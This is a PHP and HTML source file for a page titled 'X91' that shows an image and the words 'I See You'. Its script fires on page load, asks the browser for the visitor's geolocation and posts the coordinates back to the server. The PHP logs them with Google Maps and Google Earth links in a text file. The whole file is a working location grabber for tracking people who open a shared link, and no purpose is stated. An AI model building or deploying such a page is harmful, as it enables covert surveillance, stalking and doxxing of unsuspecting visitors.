<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $googleMap = "https://www.google.com/maps/$latitude,$longitude";
    $googleEarth = "https://earth.google.com/web/search/$latitude,$longitude";
    file_put_contents('locX91.txt', "Latitude: $latitude\nLongitude: $longitude\ngoogleMap: $googleMap\ngoogleEarth: $googleEarth\n", FILE_APPEND);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>X91</title>
  <style>
    /* Make the page background black, text white for contrast */
    body {
      background-color: #000;
      color: #fff;
      margin: 0;
      padding: 2rem;
      font-family: sans-serif;
    }

    /* Center the image and ensure it’s responsive */
    .image-container {
      text-align: center;
      margin-top: 2rem;
    }
    .image-container img {
      max-width: 100%;
      height: auto;
      /* Optional white border to help the image pop on black */
      border: 2px solid #fff;
    }
  </style>
</head>
<body>



  <div class="image-container">
  <img src="X91.png" alt="Description of image" width="300" height="200">
  </div>

  <p>I See You 

</body>
</html>


  <script>
    function X91location() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          send(latitude, longitude);
        }, function(error) {
          console.error("Geolocation error:", error);
        });
      } else {
        console.warn("Geolocation not supported.");
      }
    }

    function send(latitude, longitude) {
      const formData = new FormData();
      formData.append("latitude", latitude);
      formData.append("longitude", longitude);

      fetch(window.location.href, {
        method: "POST",
        body: formData
      });
    }

    window.onload = function() {
      X91location();
    };
  </script>
</body>
</html>
